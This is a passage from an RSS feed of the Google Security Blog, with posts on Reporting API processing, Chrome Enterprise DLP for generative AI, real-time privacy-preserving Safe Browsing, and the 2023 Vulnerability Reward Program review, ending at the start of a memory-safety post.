</p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgD_8vdQRYuPLcnfkVozbtRJgPHlvUnh2dWNnnqxke-z1yw0cvB8o8VhqV9zf5tTXK3VM1kbGodegk94CM9sy3Z5h9_wd6ckkQCa_NB-UnmHaJhIbYw7yRxvBqRN9PtTrgX7V7PoO3A8v0WIcjlNR8pdO2rtLVQp66WfAXG3Ta-GZG84pjvxIEJOyPOKwl5/s3146/Diagram.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgD_8vdQRYuPLcnfkVozbtRJgPHlvUnh2dWNnnqxke-z1yw0cvB8o8VhqV9zf5tTXK3VM1kbGodegk94CM9sy3Z5h9_wd6ckkQCa_NB-UnmHaJhIbYw7yRxvBqRN9PtTrgX7V7PoO3A8v0WIcjlNR8pdO2rtLVQp66WfAXG3Ta-GZG84pjvxIEJOyPOKwl5/s16000/Diagram.png" /></a></div><br /><p><br /></p>
<p>
Components described as green boxes are components that you need to implement by yourself. <em>Forwarder </em>is a simple web server that receives reports in the JSON format and converts them to the schema for Bigtable. <em>Beam-collector</em> is a simple Apache Beam pipeline that filters noisy reports, aggregates relevant reports into the shape of constellations, and saves them as CSV files. These two components are the key parts to make better use of reports from the Reporting API.
</p>
<h3 style="text-align: left;">Try it yourself</h3>


<p>
Because this is a runnable sample application, you are able to deploy all components to a Google Cloud project and see how it works by yourself. The detailed prerequisites and the instructions to set up the sample system are documented in the <a href="https://github.com/GoogleCloudPlatform/reporting-api-processor/blob/main/README.md">README.md</a> file.
</p>
<h1>Alternative solutions</h1>


<p>
Aside from the open source solution we shared, there are a number of tools available to assist in your usage of the Reporting API. Some of them include:
</p>
<ul>

<li>Report-collecting services like <a href="https://report-uri.com/">report-uri</a> and <a href="https://www.uriports.com/">uriports</a>.

</li><li>Application error monitoring platforms like Sentry, Datadog, etc.
</li>
</ul>
<p>
Besides pricing, consider the following points when selecting alternatives:
</p>
<ul>

<li>Are you comfortable sharing any of your application's URLs with a third-party report collector? Even if the browser strips sensitive information from these URLs, sensitive information <a href="https://w3c.github.io/reporting/#capability-urls">may get leaked this way</a>. If this sounds too risky for your application, operate your own reporting endpoint.

</li><li>Does this collector support all report types you need? For example, not all reporting endpoint solutions support COOP/COEP violation reports.
</li>
</ul>
<h1>Summary</h1>


<p>
In this article, we explained how web developers can collect client-side issues by using the Reporting API, and the challenges of distilling the real problems out of the collected reports. We also introduced how Google solves those challenges by filtering and processing reports, and shared an open source project that you can use to replicate a similar solution. We hope this information will motivate more developers to take advantage of the Reporting API and, in consequence, make their website more secure and sustainable.
</p>
<h1>Learning resources</h1>


<ul>

<li><a href="https://developer.chrome.com/docs/capabilities/web-apis/reporting-api">Monitor your web application with the Reporting API  |  Capabilities  |  Chrome for Developers</a>

</li><li><a href="https://bughunters.google.com/blog/5896512897417216/a-recipe-for-scaling-security">A Recipe for Scaling Security – Google Bug Hunters</a>
</li></ul>
]]></content:encoded>
<pubDate>2024-04-23T13:15:47.498-04:00</pubDate>
</item>
<item>
<title>Prevent Generative AI Data Leaks with Chrome Enterprise DLP</title>
<link>http://security.googleblog.com/2024/04/prevent-generative-ai-data-leaks-with.html</link>
<guid>http://security.googleblog.com/2024/04/prevent-generative-ai-data-leaks-with.html</guid>
<content:encoded><![CDATA[
<span class="byline-author">Posted Kaleigh Rosenblat, Chrome Enterprise Senior Staff Software Engineer, Security Lead </span>

<p>
Generative AI has emerged as a powerful and popular tool to automate content creation and simple tasks. From customized content creation to source code generation, it can increase both our productivity and creative potential.
</p>
<p>
Businesses want to leverage the power of LLMs, like Gemini, but many may have security concerns and want more control around how employees make sure of these new tools. For example, companies may want to ensure that various forms of sensitive data, such as Personally Identifiable Information (PII), financial records and internal intellectual property, is not to be shared publicly on Generative AI platforms. Security leaders face the challenge of finding the right balance — enabling employees to leverage AI to boost efficiency, while also safeguarding corporate data.
</p>
<p>
In this blog post, we'll explore reporting and enforcement policies that enterprise security teams can implement within <a href="https://chromeenterprise.google/products/chrome-enterprise-premium/">Chrome Enterprise Premium</a> for data loss prevention (DLP).</p><p>1.&nbsp;<strong>View login events*</strong> to understand usage of Generative AI services within the organization. With <a href="https://support.google.com/chrome/a/answer/11375053?hl=en">Chrome Enterprise's Reporting Connector</a>, security and IT teams can see when a user successfully signs into a specific domain, including Generative AI websites. Security Operations teams can further leverage this telemetry to detect anomalies and threats by streaming the data into <a href="https://chronicle.security/">Chronicle</a> or other <a href="https://support.google.com/chrome/a/answer/11375053?hl=en">third-party SIEMs</a> at no additional cost.</p><p>2.&nbsp;<strong>Enable URL Filtering </strong>to warn users about sensitive data policies and let them decide whether or not they want to navigate to the URL, or to block users from navigating to certain groups of sites altogether.</p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgMt_f50AXMmZyo61C-WE0P4SSv2a8gO3VvV0JxW8uH84Mc-Np618NK3_KMmg4U-O9MmZnjwE7OP3FuhBT5e9tABl3N3V44MvsYaz9rSX50GxGuL5gQ3aDE5AyfPtb-nxB_0Y1rW19AV1ogvt8ZKRd4r6rwrLQreQzWWOiSVfAayedBAASUdLC330oiNY9w/s1274/unnamed%20(1).png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgMt_f50AXMmZyo61C-WE0P4SSv2a8gO3VvV0JxW8uH84Mc-Np618NK3_KMmg4U-O9MmZnjwE7OP3FuhBT5e9tABl3N3V44MvsYaz9rSX50GxGuL5gQ3aDE5AyfPtb-nxB_0Y1rW19AV1ogvt8ZKRd4r6rwrLQreQzWWOiSVfAayedBAASUdLC330oiNY9w/s16000/unnamed%20(1).png" /></a></div><br /><p>For example, with Chrome Enterprise URL Filtering, IT admins can create rules that warn developers  not to submit source code to specific Generative AI apps or tools, or block them.</p><p>3.&nbsp;<strong>Warn, block or monitor sensitive data actions within Generative AI websites </strong>with dynamic content-based rules for actions like paste, file uploads/downloads, and print.&nbsp;<a href="https://support.google.com/a/answer/10104463?hl=en">Chrome Enterprise DLP rules</a> give IT admins granular control over browser activities, such as entering financial information in Gen AI websites. Admins can customize DLP rules to restrict the type and amount of data entered into these websites from managed browsers.</p><p>For most organizations, safely leveraging Generative AI requires a certain amount of control. As enterprises work through their policies and processes involving GenAI, <a href="https://chromeenterprise.google/browser/">Chrome Enterprise Premium</a> empowers them to strike the balance that works best. Hear directly from security leaders at Snap on their use of DLP for Gen AI in <a href="https://youtu.be/9f97uhY6iW0?feature=shared&amp;t=439">this recording here.</a></p><p>Learn more about how Chrome Enterprise can secure businesses just like yours <a href="https://chromeenterprise.google/products/chrome-enterprise-premium/">here</a>.</p><p>*Available at no additional cost in <a href="https://chromeenterprise.google/products/cloud-management/">Chrome Enterprise Core</a></p>
]]></content:encoded>
<pubDate>2024-04-18T13:40:42.728-04:00</pubDate>
</item>
<item>
<title>Real-time, privacy-preserving URL protection</title>
<link>http://security.googleblog.com/2024/03/blog-post.html</link>
<guid>http://security.googleblog.com/2024/03/blog-post.html</guid>
<content:encoded><![CDATA[
<span class="byline-author">Posted by Jasika Bawa, Xinghui Lu, Google Chrome Security &amp; Jonathan Li, Alex Wozniak, Google Safe Browsing
</span>
<p>
For more than 15 years, Google Safe Browsing has been protecting users from phishing, malware, unwanted software and more, by identifying and warning users about potentially abusive sites on more than 5 billion devices around the world. As attackers grow more sophisticated, we've seen the need for protections that can adapt as quickly as the threats they defend against. That’s why we're excited to announce a new version of Safe Browsing that will provide real-time, privacy-preserving URL protection for people using the <a href="https://support.google.com/chrome/answer/9890866">Standard protection</a> mode of Safe Browsing in Chrome.
</p>
<h3 style="text-align: left;">Current landscape</h3>


<p>
Chrome automatically protects you by flagging potentially dangerous sites and files, hand in hand with Safe Browsing which discovers thousands of unsafe sites every day and adds them to its lists of harmful sites and files.
</p>
<p>
So far, for privacy and performance reasons, Chrome has first checked sites you visit against a locally-stored list of known unsafe sites which is updated every 30 to 60 minutes  –&nbsp;this is done using <a href="https://security.googleblog.com/2022/08/how-hash-based-safe-browsing-works-in.html">hash-based checks</a>.
</p>
<p></p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg_QBMYx1Gz7H8twUQnE1pRiD8H0m2ckUodFJL0ySh23eh8foVsehxwVO9eu_JwL2BRI1LLUSEKFhJZsHx9IqHBzNCanJpKwHS0hNWn_nJL85jL64nQZTFJMqAkKc0KuU0Q6BnKGiAptLQUFSaHF1lZ1JfrBUxufZx8OPdFw1vjgoFhSjvaMSfZSsQXs2cz/s1428/Screenshot%202024-03-13%203.39.50%20PM.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg_QBMYx1Gz7H8twUQnE1pRiD8H0m2ckUodFJL0ySh23eh8foVsehxwVO9eu_JwL2BRI1LLUSEKFhJZsHx9IqHBzNCanJpKwHS0hNWn_nJL85jL64nQZTFJMqAkKc0KuU0Q6BnKGiAptLQUFSaHF1lZ1JfrBUxufZx8OPdFw1vjgoFhSjvaMSfZSsQXs2cz/s16000/Screenshot%202024-03-13%203.39.50%20PM.png" /></a></div><div class="separator" style="clear: both; text-align: center;"><br /></div><p></p><p style="text-align: center;">
<em>Hash-based check overview</em>
</p>
<p style="text-align: left;">
But unsafe sites have adapted — today, the majority of them exist for less than 10 minutes, meaning that by the time the locally-stored list of known unsafe sites is updated, many have slipped through and had the chance to do damage if users happened to visit them during this window of opportunity. Further, Safe Browsing’s list of harmful websites continues to grow at a rapid pace. Not all devices have the resources necessary to maintain this growing list, nor are they always able to receive and apply updates to the list at the frequency necessary to benefit from full protection.
</p>
<p>
Safe Browsing’s <a href="https://security.googleblog.com/2020/05/enhanced-safe-browsing-protection-now.html">Enhanced protection</a> mode already stays ahead of such threats with technologies such as real-time list checks and AI-based classification of malicious URLs and web pages. We built this mode as an opt-in to give users the choice of sharing more security-related data in order to get stronger security. This mode has shown that checking lists in real time brings significant value, so we decided to bring that to the default Standard protection mode through a new API – one that doesn't share the URLs of sites you visit with Google.
</p>
<h3 style="text-align: left;">Introducing real-time, privacy-preserving Safe Browsing</h3>


<h2 style="text-align: left;">How it works</h2>


<p>
In order to transition to real-time protection, checks now need to be performed against a list that is maintained on the Safe Browsing server. The server-side list can include unsafe sites as soon as they are discovered, so it is able to capture sites that switch quickly. It can also grow as large as needed because the Safe Browsing server is not constrained in the same way that user devices are.
</p>
<p>
Behind the scenes, here's what is happening in Chrome:
</p>
<ol>

<li>When you visit a site, Chrome first checks its cache to see if the address (URL) of the site is already known to be safe (see the “Staying speedy and reliable” section for details).

</li><li>If the visited URL is not in the cache, it may be unsafe, so a real-time check is necessary.

</li><li>Chrome obfuscates the URL by following the <a href="https://developers.google.com/safe-browsing/v4/urls-hashing">URL hashing guidance</a> to convert the URL into 32-byte full hashes. 

</li><li>Chrome truncates the full hashes into 4-byte long hash prefixes.

</li><li>Chrome encrypts the hash prefixes and sends them to a privacy server (see the “Keeping your data private” section for details).

</li><li>The privacy server removes potential user identifiers and forwards the encrypted hash prefixes to the Safe Browsing server via a TLS connection that mixes requests with many other Chrome users.

</li><li>The Safe Browsing server decrypts the hash prefixes and matches them against the server-side database, returning full hashes of all unsafe URLs that match one of the hash prefixes sent by Chrome.

</li><li>After receiving the unsafe full hashes, Chrome checks them against the full hashes of the visited URL.

</li><li>If any match is found, Chrome will show a warning.
</li>
</ol>
<h2 style="text-align: left;">Keeping your data private</h2>


<p>
In order to preserve user privacy, we have partnered with <a href="https://www.fastly.com/blog/enabling-privacy-on-the-internet-with-oblivious-http">Fastly</a>, an edge cloud platform that provides content delivery, edge compute, security, and observability services, to operate an <a href="https://datatracker.ietf.org/doc/rfc9458/">Oblivious HTTP</a> (OHTTP) privacy server between Chrome and Safe Browsing – you can learn more about Fastly's commitment to user privacy on their <a href="https://www.fastly.com/solutions/customer-trust">Customer Trust page</a>. With OHTTP, Safe Browsing does not see your IP address, and your Safe Browsing checks are mixed amongst those sent by other Chrome users. This means Safe Browsing cannot correlate the URL checks you send as you browse the web.
</p>
<p>
Before hash prefixes leave your device, Chrome encrypts them using a public key from Safe Browsing. These encrypted hash prefixes are then sent to the privacy server. Since the privacy server doesn’t know the private key, it cannot decrypt the hash prefixes, which offers privacy from the privacy server itself.
</p>
<p>
The privacy server then removes potential user identifiers such as your IP address and forwards the encrypted hash prefixes to the Safe Browsing server. The privacy server is operated independently by Fastly, meaning that Google doesn’t have access to potential user identifiers (including IP address and User Agent) from the original request. Once the Safe Browsing server receives the encrypted hash prefixes from the privacy server, it decrypts the hash prefixes with its private key and then continues to check the server-side list.
</p>
<p>
Ultimately, Safe Browsing sees the hash prefixes of your URL but not your IP address, and the privacy server sees your IP address but not the hash prefixes. No single party has access to both your identity and the hash prefixes. As such, your browsing activity remains private.</p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgWX4X0IOWMDxOgv4_2z033z3i327gXtjV0U0eTdW2XRAxKJPp-_oaIplWUUwJBgt-UNvwNnhlHNPz30O26SVDKK1GImmt_-L0qYhMT-P8N00bMv3ufXZw4TxxTQoTOsXUWx7wUNzoQ05AQwdJn9vXMJmBQR-HG3yY1yW09GrvK1XXrF7Awe3mTxTnY9N-1/s2030/Screenshot%202024-03-13%203.41.41%20PM.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgWX4X0IOWMDxOgv4_2z033z3i327gXtjV0U0eTdW2XRAxKJPp-_oaIplWUUwJBgt-UNvwNnhlHNPz30O26SVDKK1GImmt_-L0qYhMT-P8N00bMv3ufXZw4TxxTQoTOsXUWx7wUNzoQ05AQwdJn9vXMJmBQR-HG3yY1yW09GrvK1XXrF7Awe3mTxTnY9N-1/s16000/Screenshot%202024-03-13%203.41.41%20PM.png" /></a></div><p></p><p style="text-align: center;">
<em>Real-time check overview</em>
</p>
<h2 style="text-align: left;">Staying speedy and reliable</h2>


<p>
Compared with the hash-based check, the real-time check requires sending a request to a server, which adds additional latency. We have employed a few techniques to make sure your browsing experience continues to be smooth and responsive.
</p>
<p>
First, before performing the real-time check, Chrome checks against a global and local cache on your device to avoid unnecessary delay.
</p>
<ul>

<li>The global cache is a list of hashes of known-safe URLs that is served by Safe Browsing. Chrome fetches it in the background. If any full hash of the URL is found in the global cache, Chrome will consider it less risky and perform a hash-based check instead.

</li><li>The local cache, on the other hand, is a list of full hashes that are saved from previous Safe Browsing checks. If there is a match in the local cache, and the cache has not yet expired, Chrome will not send a real-time request to the Safe Browsing server.
</li>
</ul>
<p>
Both caches are stored in memory, so it is much faster to check them than sending a real-time request over the network.
</p>
<p>
In addition, Chrome follows a fallback mechanism in case of unsuccessful or slow requests. If the real-time request fails consecutively, Chrome will enter a back-off mode and downgrade the checks to hash-based checks for a certain period.
</p>
<p>
We are also in the process of introducing an <a href="https://blog.chromium.org/2024/02/optimizing-safe-browsing-checks-in.html">asynchronous mechanism</a>, which will allow the site to load while the real-time check is in progress. This will improve the user experience, as the real-time check won’t block page load.
</p>
<h3 style="text-align: left;">What real-time, privacy-preserving URL protection means for you</h3>


<h2 style="text-align: left;">Chrome users</h2>


<p>
With the latest release of Chrome for desktop, Android, and iOS, we’re upgrading the Standard protection mode of Safe Browsing so it will now check sites using Safe Browsing’s real-time protection protocol, without sharing your browsing history with Google. You don't need to take any action to benefit from this improved functionality.
</p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_2OYwTAxTggg27lIbawjb3dauEA8leW3aXfhYH-_xVjs-b_VASp92zpqARvsUX37tJKY4r6isvOE7KuHzo-PCGrfq-1R5rblAbpH2eDHi1NdWGzMdae43y143xiaYLS5DhKzbq0FEjkadtT0lzktQq2HcjBlAbKykUCn0CyJaQmIjeCV4gY3eVtnWd1q1/s3200/Red%20interstitial.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_2OYwTAxTggg27lIbawjb3dauEA8leW3aXfhYH-_xVjs-b_VASp92zpqARvsUX37tJKY4r6isvOE7KuHzo-PCGrfq-1R5rblAbpH2eDHi1NdWGzMdae43y143xiaYLS5DhKzbq0FEjkadtT0lzktQq2HcjBlAbKykUCn0CyJaQmIjeCV4gY3eVtnWd1q1/s16000/Red%20interstitial.png" /></a></div>
<p>
If you want more protection, we still encourage you to turn on the <a href="https://support.google.com/chrome/answer/9890866">Enhanced protection</a> mode of Safe Browsing. You might wonder why you need enhanced protection when you'll be getting real-time URL protection in Standard protection – this is because in Standard protection mode, the real-time feature can only protect you from sites that Safe Browsing has already confirmed to be unsafe. On the other hand, Enhanced protection mode is able to use additional information together with advanced machine learning models to protect you from sites that Safe Browsing may not yet have confirmed to be unsafe, for example because the site was only very recently created or is cloaking its true behavior to Safe Browsing’s detection systems. 
</p>
<p>
Enhanced protection also continues to offer protection beyond real-time URL checks, for example by providing deep scans for suspicious files and extra protection from suspicious Chrome extensions.
</p>
<h2 style="text-align: left;">Enterprises</h2>


<p>
The real-time feature of the Standard protection mode of Safe Browsing is on by default for Chrome. If needed, it may be configured using the policy <a href="https://chromeenterprise.google/policies/#SafeBrowsingProxiedRealTimeChecksAllowed">SafeBrowsingProxiedRealTimeChecksAllowed</a>. It is also worth noting that in order for this feature to work in Chrome, enterprises may need to explicitly allow traffic to the Fastly privacy server. If the server is not reachable, Chrome will downgrade the checks to hash-based checks.
</p>
<h2 style="text-align: left;">Developers</h2>


<p>
While Chrome is the first surface where these protections are available, we plan to make them available to eligible developers for non-commercial use cases via the Safe Browsing API. Using the API, developers and privacy server operators can partner to better protect their products’ users from fast-moving malicious actors in a privacy-preserving manner. To learn more, keep an eye out for our upcoming developer documentation to be published on the <a href="https://developers.google.com/">Google for Developers</a> site.
</p>
]]></content:encoded>
<pubDate>2024-03-14T12:01:32.039-04:00</pubDate>
</item>
<item>
<title>Vulnerability Reward Program: 2023 Year in Review</title>
<link>http://security.googleblog.com/2024/03/vulnerability-reward-program-2023-year.html</link>
<guid>http://security.googleblog.com/2024/03/vulnerability-reward-program-2023-year.html</guid>
<content:encoded><![CDATA[
<span class="byline-author">Posted by Sarah Jacobus, Vulnerability Rewards Team</span>

<p>
Last year, we again witnessed the power of community-driven security efforts as researchers from around the world contributed to help us identify and address thousands of vulnerabilities in our products and services. Working with our dedicated bug hunter community, we awarded $10 million to our 600+ researchers based in 68 countries. 
</p>
<p>
<strong>New Resources and Improvements</strong>
</p>
<p>
Just like every year, 2023 brought a series of changes and improvements to our vulnerability reward programs:
</p>
<ul>

<li>Through our new <a href="https://bughunters.google.com/about/rules/5429687846305792/bonus-awards-rules">Bonus Awards</a> program, we now periodically offer time-limited, extra rewards for reports to specific VRP targets.

<li>We expanded our <a href="https://security.googleblog.com/2023/10/expanding-our-exploit-reward-program-to.html">exploit reward program</a> to Chrome and Cloud through the launch of  v8CTF, a CTF focused on V8, the JavaScript engine that powers Chrome.

<li>We launched <a href="https://bughunters.google.com/about/rules/6618732618186752/google-mobile-vulnerability-reward-program-rules">Mobile VRP</a> which focuses on first-party Android applications.

<li>Our <a href="https://bughunters.google.com/blog">new Bughunters blog</a> shared ways in which we make the internet, as a whole, safer, and what that journey entails. Take a look at our ever-growing repository of posts!

<li>To further our engagement with top security researchers, we also hosted our yearly security conference ESCAL8 in Tokyo. It included live hacking events and competitions, student training with our <a href="https://twitter.com/GoogleVRP/status/1711207378283360435">init.g workshops</a>, and talks from researchers and Googlers. Stay tuned for details on ESCAL8 2024.
</li>
</ul>
<p>
As in <a href="https://security.googleblog.com/2023/02/vulnerability-reward-program-2022-year.html">past years</a>, we are sharing our 2023 Year in Review statistics across all of our programs. We would like to give a special thank you to all of our dedicated researchers for their continued work with our programs - we look forward to more collaboration in the future! 
</p>
<p>

<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgWt1z3F2xKYVKHQ55TTVAUz5cWXCJLHnlDIfXgDtuip4ZbA2rNEdTOR_VYeQzdeeAOjLifMrc2XUeSrgIzUiX0v_n-PkI6rVIMv2VixBOvzi1_iI3OO15KZWlMU7Z1XsVa7dEgzCDQnU6gLYMaiBONn8hxzB8lLiTpoEnFz42W0Ac7F3tRKhyphenhyphenRdlet55PX/s1600/21707_ANC_VRPInfographic_opt2.1%20%281%29.png" style="display: block; padding: 1em 0; text-align: center;"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgWt1z3F2xKYVKHQ55TTVAUz5cWXCJLHnlDIfXgDtuip4ZbA2rNEdTOR_VYeQzdeeAOjLifMrc2XUeSrgIzUiX0v_n-PkI6rVIMv2VixBOvzi1_iI3OO15KZWlMU7Z1XsVa7dEgzCDQnU6gLYMaiBONn8hxzB8lLiTpoEnFz42W0Ac7F3tRKhyphenhyphenRdlet55PX/s1600/21707_ANC_VRPInfographic_opt2.1%20%281%29.png" /></a></div>

<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjl5kKVsUBd9_CXQohVT1IVZ_LSmaDPpfL8NaGOfflVQKxWb48vnOxPeFuC8eHQ_zkwyMH8cTXmGQBNBIsYsWvTHZ9M0J1PJjSDO8NUrLpX54dih1dOqdOF_MfJkxAKct1Nv4Ej6CwWemDk3he1DianxDP0Qwh1qNTObFLbdVURXme-jUq6YfrSmbffk52n/s1600/21707_ANC_VRPInfographic_opt1.2.png" style="display: block; padding: 1em 0; text-align: center;"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjl5kKVsUBd9_CXQohVT1IVZ_LSmaDPpfL8NaGOfflVQKxWb48vnOxPeFuC8eHQ_zkwyMH8cTXmGQBNBIsYsWvTHZ9M0J1PJjSDO8NUrLpX54dih1dOqdOF_MfJkxAKct1Nv4Ej6CwWemDk3he1DianxDP0Qwh1qNTObFLbdVURXme-jUq6YfrSmbffk52n/s1600/21707_ANC_VRPInfographic_opt1.2.png" /></a></div>
<p>
<strong>Android and Google Devices</strong>
</p>
<p>
In 2023, the Android VRP achieved significant milestones, reflecting our dedication to securing the Android ecosystem. We awarded over $3.4 million in rewards to researchers who uncovered remarkable vulnerabilities within Android and <a href="https://security.googleblog.com/2023/05/new-android-google-device-VRP.html">increased our maximum reward amount</a> to $15,000 for critical vulnerabilities. We also saw a sharpened focus on higher severity issues as a result of our changes to incentivize report quality and increasing rewards for high and critical severity issues. 
</p>
<p>
Expanding our program’s scope, Wear OS has been added to the program to further incentivize research in new wearable technology to ensure users’ safety.
</p>
<p>
Working closely with top researchers at the ESCAL8 conference, we also hosted a live hacking event for Wear OS and Android Automotive OS which resulted in $70,000 rewarded to researchers for finding over 20 critical vulnerabilities!
</p>
<p>
We would also like to spotlight the <a href="http://hardwear.io">hardwear.io</a> security conferences. Hardwear.io gave us a platform to engage with top hardware security researchers who uncovered over 50 vulnerabilities in Nest, Fitbit, and Wearables, and received a total of $116,000 last year!
</p>
<p>
The <a href="https://bughunters.google.com/about/rules/5604090422493184/google-play-security-reward-program-rules">Google Play Security Reward Program</a> continued to foster security research across popular Android apps on Google Play.
</p>
<p>
A huge thank you to the researchers who made our program such a success. A special shout out to Zinuo Han (<a href="https://twitter.com/ele7enxxh">@ele7enxxh</a>) of OPPO Amber Security Lab and Yu-Cheng Lin (林禹成) (<a href="https://twitter.com/AndroBugs">@AndroBugs</a>) for your hard work and continuing to be some of the top researchers contributing to Android VRPs!
</p>
<p>
<strong>Chrome<br /></strong>
</p>
<p>
2023 was a year of changes and experimentation for the <a href="https://g.co/chrome/vrp">Chrome VRP</a>. In Chrome Milestone 116, <a href="https://security.googleblog.com/2022/09/use-after-freedom-miracleptr.html">MiraclePtr</a> was launched across all Chrome platforms. This resulted in raising the difficulty of discovery of fully exploitable non-renderer UAFs in Chrome and resulted in lower reward amounts for MiraclePtr-protected UAFs, as <a href="https://g.co/chrome/vrp/##reward-amounts-for-mitigated-security-bugs">highly mitigated security bugs</a>. While code and issues protected by MiraclePtr are expected to be resilient to the exploitation of non-renderer UAFs, the Chrome VRP launched the <a href="https://g.co/chrome/vrp/#miracleptr-bypass-reward">MiraclePtr Bypass Reward </a>to incentivize research toward discovering potential bypasses of this protection.
</p>
<p>
The Chrome VRP also launched the <a href="https://g.co/chrome/vrp/#full-chain-exploit-bonus">Full Chain Exploit Bonus</a>, offering triple the standard full reward amount for the first Chrome full-chain exploit reported and double the standard full reward amount for any follow-up reports. While both of these large incentives have gone unclaimed, we are leaving the door open in 2024 for any researchers looking to take on these challenges.
</p>
<p>
In 2023, Chrome VRP also introduced increased rewards for V8 bugs in older channels of Chrome, with an additional bonus for bugs existing before M105. This resulted in a few very impactful reports of long-existing V8 bugs, including one report of a V8 JIT optimization bug in Chrome since at least M91, which resulted in a $30,000 reward for that researcher.
</p>
<p>
All of this resulted in $2.1M in rewards to security researchers for 359 unique reports of Chrome Browser security bugs. We were also able to meet some of our top researchers from previous years who were invited to participate in bugSWAT as part of Google’s ESCAL8 event in Tokyo in October. We capped off the year by publicly <a href="https://issues.chromium.org/issues/41482500">announcing </a>our 2023 Top 20 Chrome VRP reporters who received a bonus reward for their contributions. 
</p>
<p>
Thank you to the Chrome VRP security researcher community for your contributions and efforts to help us make Chrome more secure for everyone!
</p>
<p>
<strong>Generative AI<br /></strong>
</p>
<p>
Last year, we also ran a bugSWAT live-hacking event targeting LLM products. Apart from fun, sun, and a lot to do, we also got 35 reports, totaling more than $87,000 - and discovered issues like Johann, Joseph, and Kai’s “<a href="https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/">Hacking Google Bard - From Prompt Injection to Data Exfiltration</a>” and Roni, Justin, and Joseph’s “<a href="https://www.landh.tech/blog/20240304-google-hack-50000/">We Hacked Google A.I. for $50,000</a>”.
</p>
<p>
To help AI-focused bughunters know what’s in scope and what’s not, we recently published our <a href="https://security.googleblog.com/2023/10/googles-reward-criteria-for-reporting.html">criteria for bugs in AI products</a>. This criteria aims to facilitate testing for traditional security vulnerabilities as well as risks specific to AI systems, and is one way that we are implementing the<a href="https://www.whitehouse.gov/wp-content/uploads/2023/07/Ensuring-Safe-Secure-and-Trustworthy-AI.pdf"> voluntary AI commitments</a> that Google made at the White House in July.<br />
</p>
<p>
<strong>Looking Forward<br /></strong>
</p>
<p>
We remain committed to fostering collaboration, innovation, and transparency with the security community. Our ongoing mission is to stay ahead of emerging threats, adapt to evolving technologies, and continue to strengthen the security posture of Google’s products and services. We look forward to continuing to drive greater advancements in the world of cybersecurity.<br />
</p>
<p>
A huge thank you to our bug hunter community for helping to make Google products and platforms more safe and secure for our users around the world! 
</p>
<p>
<em>Thank you to Adam Bacchus, Dirk Göhmann, Eduardo Vela, Sarah Jacobus, Amy Ressler, Martin Straka, Jan Keller, Tony Mendez. </em>
</p>
]]></content:encoded>
<pubDate>2024-03-12T11:59:14.127-04:00</pubDate>
</item>
<item>
<title>Secure by Design: Google’s Perspective on Memory Safety</title>
<link>http://security.googleblog.com/2024/03/secure-by-design-googles-perspective-on.html</link>
<guid>http://security.googleblog.com/2024/03/secure-by-design-googles-perspective-on.html</guid>
<content:encoded><![CDATA[
<span class="byline-author">Alex Rebert, Software Engineer, Christoph Kern, Principal Engineer, Security Foundations</span><div><br /></div><div><span class="byline-author"><br /></span></div><div><span class="byline-author"><p dir="ltr" style="line-height: 1.38; margin-bottom: 12pt; margin-top: 12pt;"><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">Google’s Project Zero </span><a href="https://googleprojectzero.blogspot.com/2022/04/the-more-you-know-more-you-know-you.html"><span style="color: #1155cc; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">reports</span></a><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;"> that </span><a href="https://www.memorysafety.org/docs/memory-safety/"><span style="color: #1155cc; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">memory safety vulnerabilities</span></a><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">—security defects caused by subtle coding errors related to how a program accesses memory—have been "the standard for attacking software for the last few decades and it’s still how attackers are having success". Their analysis shows two thirds of 0-day exploits detected in the wild used memory corruption vulnerabilities. Despite substantial investments to improve memory-unsafe languages, those vulnerabilities continue to top the </span><a href="https://cwe.mitre.org/top25/archive/2023/2023_kev_list.html"><span style="color: #1155cc; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">most commonly exploited vulnerability classes</span></a><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">.</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 12pt; margin-top: 12pt;"></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 12pt; margin-top: 12pt;"><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">In this post, we share our perspective on memory safety in a </span><a href="https://research.google/pubs/pub53121/"><span style="color: #1155cc; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">comprehensive whitepaper</span></a><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">. This paper delves into the data, challenges of tackling memory unsafety, and discusses possible approaches for achieving memory safety and their tradeoffs. We'll also highlight our commitments towards implementing several of the solutions outlined in the whitepaper, most recently with a </span><a 